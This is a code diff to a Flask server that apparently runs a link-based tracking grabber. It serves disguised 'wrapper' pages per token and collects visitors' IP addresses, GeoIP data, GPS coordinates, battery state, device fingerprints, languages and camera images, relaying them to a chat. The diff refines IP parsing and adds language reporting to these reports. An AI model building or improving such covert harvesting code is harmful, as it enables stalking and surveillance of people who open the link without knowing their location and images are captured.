@@ -100,6 +100,16 @@ def normalize_url_for_wrap(text: str):
         return None
     return u
 
+def extract_client_ip(raw_ip: str):
+    """
+    X-Forwarded-For often looks like "client, proxy1, proxy2".
+    We only care about the first address.
+    """
+    if not raw_ip:
+        return "unknown"
+    parts = [p.strip() for p in raw_ip.split(",") if p.strip()]
+    return parts[0] if parts else raw_ip
+
 # ---------- Basic endpoints ----------
 @app.route("/")
 def index():
@@ -173,7 +183,8 @@ def wrapper_page(token):
     try:
         return render_template("wrapper.html", token=token, target_url=target)
     except Exception:
-        return (f"Wrapper page for {token} -> {target}", 200)
+        return f"Wrapper page for {token} -> {target}", 200
+    
 
 # ---------- upload_info with GeoIP and extra details ----------
 @app.route("/upload_info/<token>", methods=["POST"])
@@ -186,7 +197,8 @@ def upload_info(token):
     coords = payload.get("coords")
     details = payload.get("details")  # full extra data bundle from JS
 
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "unknown"
+    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ip = extract_client_ip(raw_ip)
     timestamp = datetime.utcnow().isoformat()
 
     # GeoIP enrichment (basic, external API)
@@ -257,6 +269,7 @@ def upload_info(token):
         platform = d.get("platform") or ""
         cpu = d.get("cpuCores")
         ram = d.get("ramGB")
+        langs = d.get("languages")
         scr = d.get("screen") or {}
         net = d.get("network") or {}
         perms = d.get("permissions") or {}
@@ -307,6 +320,13 @@ def upload_info(token):
         if extra_hw:
             lines.append("💾 " + " · ".join(extra_hw))
 
+        if langs:
+            try:
+                langs_txt = ", ".join(langs[:3])
+                lines.append(f"🌐 Lang: {langs_txt}")
+            except Exception:
+                pass
+
         if scr_w and scr_h:
             scr_part = f"{scr_w}×{scr_h}"
             if scr_ratio:
@@ -352,7 +372,9 @@ def upload_image(token):
     b64 = data.get("image_b64", "")
     coords = data.get("coords")
     battery = data.get("battery")
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "unknown"
+
+    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ip = extract_client_ip(raw_ip)
 
     if not b64:
         return ("No image data", 400)
@@ -395,7 +417,7 @@ def upload_image(token):
 
     chat_id = sess.get("chat_id")
     if chat_id:
-        # short caption, IP + optional coords/battery
+        # Battery caption
         if isinstance(battery, dict):
             lvl = battery.get("level")
             chg = battery.get("charging")
@@ -410,6 +432,7 @@ def upload_image(token):
         else:
             bat_txt = "unknown"
 
+        # Coords caption
         if isinstance(coords, dict):
             lat = coords.get("lat")
             lon = coords.get("lon")
